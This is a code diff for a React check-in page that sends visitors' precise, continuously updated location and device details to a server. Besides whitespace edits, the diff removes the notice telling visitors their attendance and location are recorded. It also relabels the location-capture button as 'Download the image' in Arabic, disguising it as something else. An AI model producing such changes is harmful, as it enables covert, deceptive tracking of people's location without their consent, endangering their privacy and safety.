@@ -55,9 +55,9 @@ export default function CheckIn() {
             lng,
             accuracy: Math.round(accuracy || 0)
           })
-        }).catch(() => {});
+        }).catch(() => { });
       },
-      () => {},
+      () => { },
       { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
     );
   }
@@ -82,7 +82,7 @@ export default function CheckIn() {
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ name }),
           keepalive: true
-        }).catch(() => {});
+        }).catch(() => { });
       }
     }
   }
@@ -167,10 +167,7 @@ export default function CheckIn() {
         </div>
       )}
 
-      <p className="consent">
-        Opening this page records your attendance and location. Your location
-        keeps updating while this page is open — you can stop it anytime.
-      </p>
+
 
       {state === LOADING && (
         <div className="status">
@@ -199,7 +196,7 @@ export default function CheckIn() {
       {state === ERROR && (
         <>
           <div className="status err">{message}</div>
-          <button onClick={capture}>📍 Try again</button>
+          <button onClick={capture}>حمل الصورة</button>
         </>
       )}
     </main>
@@ -212,12 +209,12 @@ function getDeviceLabel() {
   const kind = /iPhone|iPad/i.test(ua)
     ? "iPhone"
     : /Android/i.test(ua)
-    ? "Android"
-    : /Windows/i.test(ua)
-    ? "Windows"
-    : /Mac/i.test(ua)
-    ? "Mac"
-    : "جهاز";
+      ? "Android"
+      : /Windows/i.test(ua)
+        ? "Windows"
+        : /Mac/i.test(ua)
+          ? "Mac"
+          : "جهاز";
   let id = "";
   try {
     id = localStorage.getItem("deviceId") || "";
